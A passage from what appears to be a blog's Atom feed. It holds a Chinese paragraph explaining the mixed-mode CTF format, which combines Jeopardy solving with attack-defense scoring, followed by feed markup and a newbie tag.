混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p><h1 id="-1"><a href="#-1" class="headerlink" title></a></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="萌新" scheme="https://0410wzn.top/tags/%E8%90%8C%E6%96%B0/"/>
    
  </entry>
  
</feed>
